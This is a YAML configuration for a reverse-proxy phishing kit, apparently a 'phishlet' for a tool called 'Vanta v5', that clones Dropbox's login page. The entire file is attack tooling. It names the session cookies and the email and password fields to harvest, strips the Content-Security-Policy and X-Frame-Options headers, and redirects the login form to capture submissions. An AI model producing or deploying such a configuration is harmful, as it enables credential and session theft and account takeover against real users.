name: "Dropbox-Login"
author: "Vanta v5"
min_ver: "5.0.0"
proxy_hosts:
  - subdomain: "dropbox"
    target: "www.dropbox.com"
auth_urls: ["/login"]
landing_path: ["/login"]
auth_tokens:
  - {type: "cookie", name: "jar"}
  - {type: "cookie", name: "gvc"}
  - {type: "cookie", name: "t"}
credentials:
  - {type: "post_param", name: "login_email", regex: null}
  - {type: "post_param", name: "login_password", regex: null}
injections: []
headers:
  - {action: "remove", name: "Content-Security-Policy"}
  - {action: "remove", name: "X-Frame-Options"}
path_rewrites:
  - {pattern: "^/$", replace: "/login", methods: ["GET"]}
cookie_rewrites: []
blocklist:
  - {pattern: "analytics|/static/|/client_log", mimes: ["text/javascript"], max_kb: 512}
form_actions:
  - {selector: "form[action*=\"login\"]", action_to: "/ajax_login"}
